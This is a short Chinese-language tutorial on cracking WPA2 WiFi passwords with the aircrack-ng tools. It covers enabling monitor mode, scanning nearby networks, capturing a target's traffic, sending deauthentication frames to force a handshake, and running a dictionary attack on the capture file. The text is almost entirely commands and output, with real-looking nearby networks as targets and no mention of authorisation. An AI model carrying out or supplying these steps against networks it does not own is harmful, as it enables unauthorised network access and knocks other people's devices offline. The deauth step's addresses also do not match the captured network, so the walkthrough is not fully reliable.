<div style="text-align: center;font-size: 40px;">wifi爆破</div>

# 查看网卡

```
iwconfig

wlp9s0    IEEE 802.11  ESSID:off/any  
          Mode:Managed  Access Point: Not-Associated   Tx-Power=-2147483648 dBm   
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:on

```

# 将无线网卡设置为监听模式

```
airmon-ng start wlp9s0

iwconfig

wlp9s0mon  IEEE 802.11  Mode:Monitor  Frequency:2.457 GHz  Tx-Power=-2147483648 dBm   
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:on
```

# 查看附近wifi

```
airodump-ng wlp9s0mon
 CH 12 ][ Elapsed: 0 s ][ 2021-03-28 02:12 

 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 B4:29:3D:19:8A:A1   -6        4        0    0  11   65   WPA2 CCMP   PSK  i6310                                                            
 B4:0F:3B:5A:60:09  -49        5        0    0   5  130   WPA2 CCMP   PSK  Tenda_5A6008
```

# 查看指定wifi的连接设备 keep it alive

```
airodump-ng -c 5 --bssid B4:0F:3B:5A:60:09 -w temp/Tenda_5A6008 wlp9s0mon
## 未获取到握手包
 CH  5 ][ Elapsed: 2 mins ][ 2021-03-28 02:16 

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 B4:0F:3B:5A:60:09  -50 100     1389       27    0   5  130   WPA2 CCMP   PSK  Tenda_5A6008                                                 

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 B4:0F:3B:5A:60:09  CE:95:40:7E:DA:92  -44    0e- 1      0       20                                                                          
 B4:0F:3B:5A:60:09  4A:26:6E:B7:EE:FE  -48    0e- 1      0       43 
## 获取到握手包
CH  5 ][ Elapsed: 30 s ][ 2021-03-28 02:18 ][ WPA handshake: B4:0F:3B:5A:60:09 

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 B4:0F:3B:5A:60:09  -49 100      321      400    7   5  130   WPA2 CCMP   PSK  Tenda_5A6008                                                 

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 B4:0F:3B:5A:60:09  CE:95:40:7E:DA:92    0    0e- 1      0      623                                                                          
 B4:0F:3B:5A:60:09  4A:26:6E:B7:EE:FE  -46    0e- 6      7      219  EAPOL 
```

# 获取握手包 新开一个terminal

```
sudo aireplay-ng -0 2 -c C8:C2:FA:4C:15:51 -a B4:29:3D:19:8A:A1 wlp9s0mon
```

# 跑字典暴破wifi

```
aircrack-ng -w 字典.txt Tenda_5A6008-02.cap
```
